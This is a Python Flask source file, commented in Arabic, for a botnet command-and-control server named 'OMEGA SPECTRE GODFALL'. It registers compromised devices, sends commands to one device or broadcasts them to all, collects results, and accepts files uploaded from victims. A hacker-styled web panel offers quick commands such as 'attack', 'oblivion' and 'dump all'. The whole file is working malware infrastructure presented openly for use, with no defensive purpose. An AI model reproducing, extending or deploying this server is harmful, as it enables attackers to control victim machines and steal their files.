#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OMEGA SPECTRE GODFALL - C2 Server
خادم التحكم المركزي لجميع الملفات المخترقة
"""

import os
import sys
import json
import time
import hashlib
import socket
import threading
import subprocess
from datetime import datetime
from flask import Flask, request, jsonify, send_file, render_template_string
import requests

app = Flask(__name__)

# ================================================================
# قاعدة البيانات (في الذاكرة)
# ================================================================

DEVICES = {}           # جميع الأجهزة المخترقة
COMMANDS = {}          # الأوامر المعلقة
RESULTS = {}           # النتائج المستلمة
ERRORS = {}            # الأخطاء
HEARTBEATS = {}        # نبضات القلب
FILES = {}             # الملفات المخترقة
UPLOADS = {}           # الملفات المرفوعة

# ================================================================
# واجهات API
# ================================================================

@app.route('/register', methods=['POST'])
def register():
    """تسجيل جهاز جديد"""
    try:
        data = request.json
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400
        
        DEVICES[device_id] = {
            'info': data,
            'registered_at': datetime.now().isoformat(),
            'last_seen': time.time(),
            'status': 'active',
            'files': []
        }
        
        # إرسال أي أوامر معلقة
        if device_id in COMMANDS:
            return jsonify({'command': COMMANDS[device_id].get('command')})
        
        return jsonify({'status': 'registered', 'device_id': device_id})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """استقبال نبضات القلب"""
    try:
        data = request.json
        device_id = data.get('device_id')
        
        if device_id in DEVICES:
            DEVICES[device_id]['last_seen'] = time.time()
            DEVICES[device_id]['status'] = 'active'
        
        HEARTBEATS[device_id] = {
            'data': data,
            'timestamp': time.time()
        }
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/get_command/<device_id>', methods=['GET'])
def get_command(device_id):
    """استرجاع أمر لجهاز معين"""
    try:
        if device_id in COMMANDS:
            command = COMMANDS[device_id]
            # حذف الأمر بعد استرجاعه (أمر لمرة واحدة)
            # COMMANDS.pop(device_id, None)
            return jsonify(command)
        return jsonify({'command': None})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/result', methods=['POST'])
def result():
    """استقبال نتائج التنفيذ"""
    try:
        data = request.json
        device_id = data.get('device_id')
        
        RESULTS[device_id] = {
            'data': data,
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/error', methods=['POST'])
def error():
    """استقبال أخطاء التنفيذ"""
    try:
        data = request.json
        device_id = data.get('device_id')
        
        ERRORS[device_id] = {
            'data': data,
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    """إرسال أمر لجهاز معين أو لجميع الأجهزة"""
    try:
        data = request.json
        device_id = data.get('device_id', 'all')
        command = data.get('command')
        
        if not command:
            return jsonify({'error': 'Missing command'}), 400
        
        if device_id == 'all':
            # إرسال الأمر لجميع الأجهزة
            count = 0
            for dev_id in DEVICES.keys():
                COMMANDS[dev_id] = {'command': command}
                count += 1
            return jsonify({'status': 'broadcasted', 'devices': count})
        
        COMMANDS[device_id] = {'command': command}
        return jsonify({'status': 'sent', 'device': device_id})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/status', methods=['GET'])
def status():
    """عرض حالة النظام"""
    try:
        active_devices = sum(1 for d in DEVICES.values() 
                            if time.time() - d.get('last_seen', 0) < 60)
        
        return jsonify({
            'total_devices': len(DEVICES),
            'active_devices': active_devices,
            'commands_pending': len(COMMANDS),
            'results_received': len(RESULTS),
            'errors': len(ERRORS),
            'files': len(FILES),
            'timestamp': datetime.now().isoformat()
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/devices', methods=['GET'])
def list_devices():
    """عرض جميع الأجهزة المخترقة"""
    try:
        devices_list = []
        for device_id, info in DEVICES.items():
            devices_list.append({
                'device_id': device_id,
                'info': info.get('info', {}),
                'last_seen': info.get('last_seen'),
                'status': info.get('status', 'unknown'),
                'registered_at': info.get('registered_at')
            })
        return jsonify(devices_list)
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/results/<device_id>', methods=['GET'])
def get_results(device_id):
    """استرجاع نتائج جهاز معين"""
    try:
        if device_id == 'all':
            return jsonify(RESULTS)
        return jsonify(RESULTS.get(device_id, {}))
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload_file():
    """استقبال ملف من جهاز مخترق"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        device_id = request.form.get('device_id', 'unknown')
        filename = request.form.get('filename', file.filename)
        
        # حفظ الملف
        upload_dir = 'uploads'
        os.makedirs(upload_dir, exist_ok=True)
        
        safe_filename = f"{device_id}_{int(time.time())}_{filename}"
        filepath = os.path.join(upload_dir, safe_filename)
        file.save(filepath)
        
        UPLOADS[device_id] = {
            'filename': filename,
            'saved_as': safe_filename,
            'path': filepath,
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify({'status': 'uploaded', 'filename': filename})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/download/<device_id>/<filename>', methods=['GET'])
def download_file(device_id, filename):
    """تحميل ملف من جهاز مخترق"""
    try:
        # البحث عن الملف في uploads
        for file in os.listdir('uploads'):
            if device_id in file and filename in file:
                return send_file(os.path.join('uploads', file), as_attachment=True)
        
        return jsonify({'error': 'File not found'}), 404
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/execute', methods=['POST'])
def execute():
    """تنفيذ أمر على جميع الملفات"""
    try:
        data = request.json
        command = data.get('command')
        target = data.get('target', 'all')
        
        if not command:
            return jsonify({'error': 'Missing command'}), 400
        
        # إرسال الأمر للأجهزة
        if target == 'all':
            for device_id in DEVICES.keys():
                COMMANDS[device_id] = {'command': command}
            return jsonify({'status': 'executing', 'devices': len(DEVICES)})
        
        COMMANDS[target] = {'command': command}
        return jsonify({'status': 'executing', 'device': target})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ================================================================
# لوحة التحكم
# ================================================================

@app.route('/')
def index():
    """لوحة التحكم الرئيسية"""
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>OMEGA SPECTRE C2</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                padding: 20px;
                min-height: 100vh;
            }
            .container { max-width: 1400px; margin: 0 auto; }
            .header {
                text-align: center;
                padding: 20px;
                border-bottom: 2px solid #00ff00;
                margin-bottom: 30px;
            }
            .header h1 {
                font-size: 3em;
                color: #ff0000;
                text-shadow: 0 0 20px #ff0000, 0 0 40px #ff000044;
            }
            .header h2 {
                color: #00ffff;
                font-size: 1.2em;
                margin-top: 10px;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(5, 1fr);
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-box {
                background: #1a1a1a;
                border: 1px solid #00ff00;
                padding: 20px;
                text-align: center;
                border-radius: 10px;
                transition: all 0.3s;
            }
            .stat-box:hover {
                border-color: #ff0000;
                box-shadow: 0 0 30px rgba(255,0,0,0.3);
            }
            .stat-box .number {
                font-size: 2.5em;
                color: #ff0000;
                font-weight: bold;
            }
            .stat-box .label {
                color: #666;
                margin-top: 10px;
                font-size: 0.9em;
            }
            .controls {
                background: #1a1a1a;
                border: 2px solid #ff0000;
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 30px;
            }
            .controls h3 {
                color: #ff0000;
                margin-bottom: 15px;
            }
            .controls .row {
                display: flex;
                gap: 10px;
                flex-wrap: wrap;
            }
            .controls input {
                background: #0a0a0a;
                border: 1px solid #00ff00;
                color: #00ff00;
                padding: 12px;
                flex: 1;
                min-width: 200px;
                font-family: 'Courier New', monospace;
                border-radius: 5px;
            }
            .controls input:focus {
                outline: none;
                border-color: #ff0000;
            }
            .controls select {
                background: #0a0a0a;
                border: 1px solid #00ff00;
                color: #00ff00;
                padding: 12px;
                font-family: 'Courier New', monospace;
                border-radius: 5px;
                cursor: pointer;
            }
            .controls button {
                background: #ff0000;
                color: #000;
                border: none;
                padding: 12px 25px;
                cursor: pointer;
                font-weight: bold;
                font-family: 'Courier New', monospace;
                border-radius: 5px;
                transition: all 0.3s;
            }
            .controls button:hover {
                background: #00ff00;
                box-shadow: 0 0 20px #00ff0044;
            }
            .controls button.secondary {
                background: #333;
                color: #00ff00;
            }
            .controls button.secondary:hover {
                background: #555;
            }
            .output {
                background: #0a0a0a;
                border: 1px solid #00ff00;
                padding: 20px;
                height: 250px;
                overflow-y: auto;
                font-size: 0.9em;
                margin-bottom: 30px;
                border-radius: 10px;
            }
            .output .cmd { color: #00ffff; }
            .output .result { color: #ffaa00; }
            .output .error { color: #ff0000; }
            .output .info { color: #666; }
            .output .success { color: #00ff00; }
            .device-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                gap: 10px;
            }
            .device-card {
                background: #1a1a1a;
                border: 1px solid #333;
                padding: 15px;
                border-radius: 5px;
                transition: all 0.3s;
            }
            .device-card:hover {
                border-color: #00ff00;
            }
            .device-card .id { color: #00ffff; font-size: 0.8em; }
            .device-card .file { color: #ffaa00; font-size: 0.8em; }
            .device-card .status { color: #00ff00; }
            .device-card .status.offline { color: #ff0000; }
            .device-card .ip { color: #666; font-size: 0.8em; }
            .device-card .time { color: #444; font-size: 0.7em; }
            @keyframes blink {
                0% { opacity: 1; }
                50% { opacity: 0.3; }
                100% { opacity: 1; }
            }
            .online { animation: blink 2s infinite; }
            ::-webkit-scrollbar {
                width: 10px;
                background: #0a0a0a;
            }
            ::-webkit-scrollbar-thumb {
                background: #00ff00;
                border-radius: 5px;
            }
            ::-webkit-scrollbar-thumb:hover {
                background: #ff0000;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔥 OMEGA SPECTRE GODFALL C2 🔥</h1>
                <h2>📍 Command & Control Panel v∞</h2>
                <div style="margin-top: 10px; font-size: 0.8em; color: #444;">
                    Active since: <span id="uptime">Loading...</span>
                </div>
            </div>
            
            <div class="stats" id="stats">
                <div class="stat-box">
                    <div class="number" id="totalDevices">0</div>
                    <div class="label">📱 Total Devices</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="activeDevices">0</div>
                    <div class="label">⚡ Active Devices</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="pendingCommands">0</div>
                    <div class="label">📤 Pending Commands</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="resultsCount">0</div>
                    <div class="label">📥 Results</div>
                </div>
                <div class="stat-box">
                    <div class="number" id="errorsCount">0</div>
                    <div class="label">⚠️ Errors</div>
                </div>
            </div>
            
            <div class="controls">
                <h3>⚡ COMMAND CENTER ⚡</h3>
                <div class="row">
                    <input type="text" id="commandInput" placeholder="Enter command (e.g., exec q_engine.py --attack)">
                    <select id="targetSelect">
                        <option value="all">🌐 All Devices</option>
                    </select>
                    <button onclick="sendCommand()">🚀 EXECUTE</button>
                    <button onclick="clearOutput()" class="secondary">🗑️ CLEAR</button>
                    <button onclick="refreshDevices()" class="secondary">🔄 REFRESH</button>
                </div>
                <div style="margin-top: 10px; font-size: 0.8em; color: #444;">
                    Quick commands: 
                    <span style="color: #00ff00; cursor: pointer;" onclick="setCommand('exec quantum_core/q_engine.py')">q_engine</span> |
                    <span style="color: #00ff00; cursor: pointer;" onclick="setCommand('exec ai_autopilot/attack_planner.py')">attack</span> |
                    <span style="color: #00ff00; cursor: pointer;" onclick="setCommand('exec annihilation_arsenal/total_oblivion.py')">oblivion</span> |
                    <span style="color: #00ff00; cursor: pointer;" onclick="setCommand('status')">status</span> |
                    <span style="color: #00ff00; cursor: pointer;" onclick="setCommand('dump all')">dump</span>
                </div>
            </div>
            
            <div class="output" id="output">
                <div class="info">> OMEGA SPECTRE C2 - Initialized</div>
                <div class="info">> Waiting for connections...</div>
                <div class="info">> Use commands to control all devices</div>
            </div>
            
            <h3 style="color: #00ffff; margin-bottom: 15px;">📱 Connected Devices</h3>
            <div class="device-grid" id="deviceList">
                <div class="info" style="color: #444;">No devices connected yet</div>
            </div>
        </div>
        
        <script>
            let uptimeStart = Date.now();
            
            // تحديث وقت التشغيل
            function updateUptime() {
                const elapsed = Math.floor((Date.now() - uptimeStart) / 1000);
                const hours = Math.floor(elapsed / 3600);
                const minutes = Math.floor((elapsed % 3600) / 60);
                const seconds = elapsed % 60;
                document.getElementById('uptime').textContent = 
                    `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }
            
            // تحديث الإحصائيات
            function updateStats() {
                fetch('/status')
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('totalDevices').textContent = data.total_devices || 0;
                        document.getElementById('activeDevices').textContent = data.active_devices || 0;
                        document.getElementById('pendingCommands').textContent = data.commands_pending || 0;
                        document.getElementById('resultsCount').textContent = data.results_received || 0;
                        document.getElementById('errorsCount').textContent = data.errors || 0;
                    })
                    .catch(() => {});
            }
            
            // تحديث قائمة الأجهزة
            function updateDevices() {
                fetch('/devices')
                    .then(r => r.json())
                    .then(devices => {
                        const container = document.getElementById('deviceList');
                        const select = document.getElementById('targetSelect');
                        
                        // تحديث القائمة المنسدلة
                        select.innerHTML = '<option value="all">🌐 All Devices</option>';
                        devices.forEach(device => {
                            const opt = document.createElement('option');
                            opt.value = device.device_id;
                            opt.textContent = `${device.device_id.slice(0, 8)}... (${device.info?.file || 'unknown'})`;
                            select.appendChild(opt);
                        });
                        
                        // تحديث بطاقات الأجهزة
                        if (!devices || devices.length === 0) {
                            container.innerHTML = '<div class="info" style="color: #444;">No devices connected yet</div>';
                            return;
                        }
                        
                        container.innerHTML = '';
                        devices.forEach(device => {
                            const card = document.createElement('div');
                            card.className = 'device-card';
                            const statusClass = device.status === 'active' ? 'status online' : 'status offline';
                            const lastSeen = device.last_seen ? new Date(device.last_seen * 1000).toLocaleTimeString() : 'Never';
                            card.innerHTML = `
                                <div class="id">🔗 ${device.device_id.slice(0, 12)}...</div>
                                <div class="file">📄 ${device.info?.file || 'Unknown'}</div>
                                <div class="ip">🌐 ${device.info?.ip || 'Unknown'}</div>
                                <div class="${statusClass}">${device.status || 'unknown'}</div>
                                <div class="time">⏱️ ${lastSeen}</div>
                            `;
                            container.appendChild(card);
                        });
                    })
                    .catch(() => {});
            }
            
            // إرسال أمر
            function sendCommand() {
                const input = document.getElementById('commandInput');
                const target = document.getElementById('targetSelect').value;
                const cmd = input.value.trim();
                if (!cmd) return;
                
                const output = document.getElementById('output');
                output.innerHTML += `<div class="cmd">> [${target}] ${cmd}</div>`;
                output.scrollTop = output.scrollHeight;
                
                fetch('/send_command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        device_id: target,
                        command: cmd
                    })
                })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'broadcasted' || data.status === 'sent') {
                        output.innerHTML += `<div class="success">> ✅ Command sent to ${data.devices || 1} device(s)</div>`;
                    } else {
                        output.innerHTML += `<div class="error">> ❌ Error: ${data.error || 'Unknown error'}</div>`;
                    }
                    output.scrollTop = output.scrollHeight;
                })
                .catch(error => {
                    output.innerHTML += `<div class="error">> ❌ Connection error: ${error}</div>`;
                    output.scrollTop = output.scrollHeight;
                });
                
                input.value = '';
            }
            
            // تعيين أمر سريع
            function setCommand(cmd) {
                document.getElementById('commandInput').value = cmd;
                document.getElementById('commandInput').focus();
            }
            
            // مسح المخرجات
            function clearOutput() {
                document.getElementById('output').innerHTML = '<div class="info">> Output cleared</div>';
            }
            
            // تحديث الأجهزة
            function refreshDevices() {
                const output = document.getElementById('output');
                output.innerHTML += `<div class="info">> 🔄 Refreshing...</div>`;
                output.scrollTop = output.scrollHeight;
                updateDevices();
                updateStats();
            }
            
            // تحديث كل 5 ثواني
            setInterval(updateUptime, 1000);
            setInterval(updateStats, 3000);
            setInterval(updateDevices, 5000);
            
            // تشغيل فوري
            updateUptime();
            updateStats();
            updateDevices();
            
            // إدخال الأوامر بالضغط على Enter
            document.getElementById('commandInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    sendCommand();
                }
            });
        </script>
    </body>
    </html>
    ''')

# ================================================================
# تشغيل الخادم
# ================================================================

if __name__ == "__main__":
    # إنشاء المجلدات المطلوبة
    os.makedirs('uploads', exist_ok=True)
    os.makedirs('logs', exist_ok=True)
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   🔥 OMEGA SPECTRE GODFALL - C2 SERVER 🔥               ║
    ║                                                          ║
    ║   🚀 Server starting on: http://0.0.0.0:8080           ║
    ║   📡 Control Panel: http://YOUR_IP:8080                ║
    ║                                                          ║
    ║   ⚡ Ready to receive connections                       ║
    ║   💀 All devices will be controlled from here           ║
    ║                                                          ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)